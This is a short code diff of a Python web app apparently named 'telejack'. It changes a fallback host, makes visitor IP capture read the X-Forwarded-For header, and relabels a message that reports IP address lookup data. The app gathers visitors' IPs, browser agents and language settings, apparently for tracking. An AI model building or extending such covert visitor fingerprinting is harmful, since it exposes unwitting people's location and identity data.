@@ -34,7 +34,7 @@ def GET_HOST():
     try :
         return request.host_url
     except :
-        return "https://telejack.onrender.com/"
+        return "/"
 
 host = GET_HOST()
 
@@ -66,7 +66,7 @@ def message(message):
             
             
 def USERS():
-    ip = request.remote_addr
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr) 
     user = request.headers.get('User-Agent')
     lang = request.accept_languages
     data = request.accept_mimetypes
@@ -293,7 +293,7 @@ def ip():
     hi = jdata(data)
     ip = data['ip']
     ha6 = jdata(ipdata(ip))
-    m =f"""ip addres data \n
+    m =f"""MORE IP ADDRESSE DATA  \n
     ```
     {ha6}
     ```
